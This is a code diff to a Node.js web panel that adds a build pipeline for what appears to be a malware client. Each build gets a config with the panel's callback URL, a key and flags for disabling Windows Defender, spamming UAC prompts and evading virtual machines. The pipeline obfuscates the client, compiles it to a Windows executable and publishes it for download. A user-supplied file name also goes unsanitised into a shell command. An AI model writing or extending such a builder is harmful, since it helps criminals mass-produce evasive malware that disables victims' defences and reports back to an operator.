@@ -1,4 +1,11 @@
 const database = require('../../database/database');
+const util = require('util');
+const exec = util.promisify(require('child_process').exec);
+const config = require('../../config');
+const obfuscator = require('../obfuscator');
+const childprocess = require('child_process');
+const path = require('path');
+const fs = require('fs');
 
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
@@ -36,10 +43,24 @@ class BuildQueue {
             }
 
             const build = this.queue[0];
-            console.log("t");
-            console.log(build.username, build.name, build.ico, build.antivm);
-            //TODO: add build mechanism
-            database.addBuild(build.username, "success", "path");
+            const user = await database.getUser(build.id);
+            let clientConfig = `{
+                baseurl: "${config.baseurl + 'api'}",
+                id: "${build.id}",
+                encryptedKey: "${user.encryptedKey}",
+                uacSpam: ${build.uacspam},
+                disableDefender: ${build.wdefender},
+                antivm: ${build.antivm}
+            }`;
+            
+            fs.writeFileSync(path.join(process.cwd(), 'client', 'config.js'), "module.exports = " + clientConfig);
+            await obfuscator.obfuscate();
+
+            await exec(`pkg -C GZip -o ${build.name}.exe .`, { cwd: path.join(process.cwd(), 'client') });
+            fs.renameSync(path.join(process.cwd(), 'client', `${build.name}.exe`), path.join(process.cwd(), 'panel', 'public', 'builds', `${build.name}.exe`) );
+            
+            await obfuscator.desobfuscate();
+            database.addBuild(build.username, "success", `/builds/${build.name}.exe`);
 
             this.queue.shift();
         }
@@ -69,11 +90,12 @@ exports.buildsPost = async (req, res) => {
 
     const builds = await database.getBuilds(req.session.username);
 
-    const ico = req.body.ico,
-        name = req.body.name,
-        antivm = typeof req.body.antivm != "undefined" && req.body.antivm == 'on';
+    const name = req.body.name,
+        antivm = typeof req.body.antivm != "undefined" && req.body.antivm == 'on',
+        wdefender = typeof req.body.antivm != "undefined" && req.body.antivm == 'on',
+        uacspam = typeof req.body.antivm != "undefined" && req.body.antivm == 'on';
 
-    if (typeof ico == 'undefined' || ico == '' || typeof name == 'undefined' || name == '') {
+    if (typeof name == 'undefined' || name == '') {
         return res.render('builds', {
             error: "Some fields are empty / undefined."
         });
@@ -87,9 +109,11 @@ exports.buildsPost = async (req, res) => {
 
     buildQueue.add({
         username: req.session.username,
-        ico: ico,
+        id: req.session.userid,
         name: name,
-        antivm: antivm
+        antivm: antivm,
+        uacspam: uacspam,
+        wdefender: wdefender
     });
 
     return res.render('builds', {
@@ -109,6 +133,9 @@ exports.buildDelete = async (req, res) => {
     if (typeof id == 'undefined' || id == '') {
         return res.redirect('/panel/builds');
     }
+
+    const build = await database.getBuild(req.session.username, id);
+    fs.rmSync(path.join(process.cwd(), 'panel', 'public', build.path));
 
     await database.deleteBuild(id, req.session.username);
 
